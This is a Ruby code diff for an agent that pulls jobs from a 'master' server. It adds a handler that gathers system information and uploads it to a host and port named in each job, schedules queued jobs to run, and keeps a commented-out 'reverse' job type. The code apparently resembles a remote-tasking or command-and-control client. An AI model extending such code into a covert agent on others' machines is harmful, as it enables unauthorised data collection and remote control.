@@ -8,13 +8,19 @@ def clearjobs(host, port, key, masterkey)
         return response
 end
 
-def processjobs(job)
+def processjobs(job, key)
         jobresult = ""
         jobcmd = job.split(":")[1]
+
         case jobcmd
-        when "system"
-                puts "got system"
-        when "reverse"
+        when "system_info"
+        	host = job.split(":")[4].strip
+		puts "Host is #{host}"
+        	port = job.split(":")[5].strip
+		puts "Port is #{port}"
+		jobresult = system_info()
+		upload(host, port, key, jobresult, "system_info") 
+	when "reverse"
         #       reverse(job)
         when "promote"
                 puts "got promote"
@@ -25,14 +31,28 @@ def processjobs(job)
 
 end
 
+def sched_job(jobqueue, key)
+	scheduler = Rufus::Scheduler.start_new
+	jobqueue = jobqueue.flatten.uniq
+	jobqueue.each { |job|
+	        puts job
+	        puts "Scheduling job"
+	        if !job.nil?
+	                scheduler.in '2s' do
+	                        puts "Executing job: #{job}"
+				puts processjobs(job, key)
+				puts "Job complete: #{job}"
+	                end
+        end
+}
+end
+
+
 def pull_jobs(master, key)
 jobthreads = []
 threads = []
 jobqueue = []
 
-#masterslist.each { |master|
-        # mmmmm multithreading!
-#        threads << Thread.new {
         puts "connecting to master: #{master}"
         host = master.split(":")[0]
         port = master.split(":")[1]
@@ -51,13 +71,6 @@ jobqueue = []
                 clearjobs(host, port, key, masterkey)
                 if jobqueue.length == 0
                         puts "emtpy job queue"
-#               else
-#                       jobqueue.each { |job|
-#                               puts "Executing job: #{job}"
-#                               jobresult = processjob(job)
-#                       }
-#                       puts "Clearing job file"
-#                       clearjobs(host, port, key, masterkey)
                 end
         end
         rescue
